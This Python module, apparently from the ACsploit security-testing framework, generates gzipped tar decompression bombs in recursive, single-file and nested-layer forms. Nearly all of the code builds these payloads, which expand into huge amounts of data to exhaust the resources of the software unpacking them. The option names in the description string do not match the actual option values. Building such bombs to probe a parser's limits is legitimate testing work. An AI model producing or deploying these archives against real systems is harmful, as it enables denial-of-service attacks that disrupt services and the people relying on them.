import os
import io
import tarfile
import math

from acsploit.options import Options


options = Options()
options.add_option('type', 'recursive', 'Type of bomb', ['single_file', 'layer', 'recursive'])
options.add_option('target_size', 100000,
                   'Desired size of decompressed file in bytes (not applicable to recursive bombs)')
options.add_option('n_layers', 3,
                   'Number of nested layers of archives (only relevant for layer bombs)')

DESCRIPTION = 'Produces a gzipped tar archive that expands into a very large file or set of files.\n\n  The "recursive" bomb ' \
              'produces a self-reproducing bomb that will continue to decompress unless a ' \
              'limit is set in the parser (see https://research.swtch.com/zip for a full description.) The "single_layer" ' \
              'bomb creates a single file which decompresses to the target size in bytes. The single_layer bomb may use ' \
              'significant resources when built for large sizes, as ACsploit compresses the payload itself. Use caution' \
              'when executing with this option. The "layered" bomb contains nested archives with the depth controlled by ' \
              'the "n_layers" parameter.'

NO_INPUT = True
DEFAULT_OUTPUT = 'file'
DEFAULT_OUTPUT_OPTIONS = {
    'final_newline': False,
    'format': 'binary'
}


def run(output):
    if options['type'] == 'recursive':
        with open(os.path.join(os.path.dirname(os.path.realpath(__file__)),
                               'bombs-DONOTOPEN', 'tar_gz_recursive.tar.gz'), 'rb') as f:
            tar_gz_contents = f.read()
    elif options['type'] == 'single_file':
        tar_gz_contents = make_single_layer_bomb(options['target_size'])
    elif options['type'] == 'layer':
        tar_gz_contents = make_layer_tar_bomb(options['target_size'], options['n_layers'])
    else:
        raise AssertionError('Unknown tar.gz bomb type: this should be impossible')

    output.output([tar_gz_contents])


def add_file_to_tar(tar, filename, size):
    with io.BytesIO() as memfile:
        memfile.write(b'0' * size)
        memfile.seek(0)
        tarinfo = tarfile.TarInfo(filename)
        tarinfo.size = size
        tar.addfile(tarinfo, memfile)


def make_single_layer_bomb(target_size, file_size=100000):
    with io.BytesIO() as memtarfile:
        with tarfile.open('singlefilebomb.tar', fileobj=memtarfile, mode='w|gz') as tar:
            for i in range(target_size // file_size):
                add_file_to_tar(tar, 'file_{}'.format(i), file_size)
            if target_size % file_size > 0:
                add_file_to_tar(tar, 'file_{}'.format(target_size // file_size), target_size % file_size)
        return memtarfile.getvalue()


def make_copies_and_compress(contents, n_copies):
    with io.BytesIO() as memtarfile, io.BytesIO(contents) as tar_contents:
        with tarfile.open('layer.tar', fileobj=memtarfile, mode='w|gz') as tar:
            for i in range(n_copies):
                tarinfo = tarfile.TarInfo('file_{}.tar.gz'.format(i))
                tarinfo.size = len(tar_contents.getvalue())
                tar.addfile(tarinfo, tar_contents)
                tar_contents.seek(0)

        return memtarfile.getvalue()


def make_layer_tar_bomb(target_size, n_layers, base_file_size=100000):
    n_files = math.ceil(target_size / base_file_size)
    files_per_layer = math.ceil(n_files ** (1 / n_layers))

    targz_contents = make_single_layer_bomb(files_per_layer * base_file_size, base_file_size)
    for i in range(n_layers):
        targz_contents = make_copies_and_compress(targz_contents, files_per_layer)

    return targz_contents
